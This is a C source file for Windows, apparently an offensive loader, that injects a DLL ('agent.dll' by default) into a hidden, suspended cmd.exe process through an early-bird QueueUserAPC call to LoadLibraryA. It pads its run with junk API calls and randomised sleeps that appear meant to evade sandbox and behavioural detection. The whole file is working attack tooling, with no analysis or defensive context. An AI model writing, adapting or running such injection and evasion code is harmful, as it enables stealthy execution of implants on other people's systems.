#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

static void Hammer(void) {
    WCHAR b[256]; DWORD l = 256; volatile int d = 0;
    for (int i = 0; i < 50; i++) {
        GetSystemDirectoryW(b, l); GetWindowsDirectoryW(b, l);
        GetTempPathW(l, b); GetTickCount(); d += (int)b[0];
    }
}

static DWORD FindThread(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    THREADENTRY32 te; te.dwSize = sizeof(te); DWORD tid = 0;
    if (Thread32First(snap, &te)) {
        do { if (te.th32OwnerProcessID == pid) { tid = te.th32ThreadID; break; } }
        while (Thread32Next(snap, &te));
    }
    CloseHandle(snap); return tid;
}

int main(int argc, char *argv[]) {
    const char *dll  = argc > 1 ? argv[1] : "agent.dll";
    const char *proc = argc > 2 ? argv[2] : "cmd.exe";

    Hammer(); Sleep(1500 + (GetTickCount() & 0xFFF)); Hammer();

    char dllPath[MAX_PATH]; GetFullPathNameA(dll, MAX_PATH, dllPath, NULL);
    
    // Build target: cmd.exe /k (stays alive, no window)
    char sysDir[MAX_PATH]; GetSystemDirectoryA(sysDir, MAX_PATH);
    char targetPath[MAX_PATH];
    lstrcpyA(targetPath, sysDir);
    lstrcatA(targetPath, "\\");
    lstrcatA(targetPath, proc);

    printf("[+] Target: %s\n", targetPath);

    STARTUPINFOA si; PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si)); si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE;

    if (!CreateProcessA(NULL, targetPath, NULL, NULL, FALSE,
                        CREATE_SUSPENDED | CREATE_NO_WINDOW,
                        NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcess(%s): %lu\n", targetPath, GetLastError());
        return 1;
    }
    printf("[+] PID: %lu\n", pi.dwProcessId);

    DWORD sz = (DWORD)lstrlenA(dllPath) + 1;
    LPVOID mem = VirtualAllocEx(pi.hProcess, NULL, sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 1; }
    WriteProcessMemory(pi.hProcess, mem, dllPath, sz, NULL);

    LPVOID pLL = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    DWORD tid = FindThread(pi.dwProcessId);
    if (!tid) tid = pi.dwThreadId;
    HANDLE hTh = OpenThread(THREAD_SET_CONTEXT|THREAD_SUSPEND_RESUME, FALSE, tid);
    if (!hTh) { TerminateProcess(pi.hProcess, 0); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 1; }

    Hammer();
    QueueUserAPC((PAPCFUNC)pLL, hTh, (ULONG_PTR)mem);
    ResumeThread(hTh);
    printf("[+] Injected\n");

    Sleep(3000);
    VirtualFreeEx(pi.hProcess, mem, 0, MEM_RELEASE);
    CloseHandle(hTh); CloseHandle(pi.hProcess); CloseHandle(pi.hThread);
    printf("[+] Done\n");
    return 0;
}
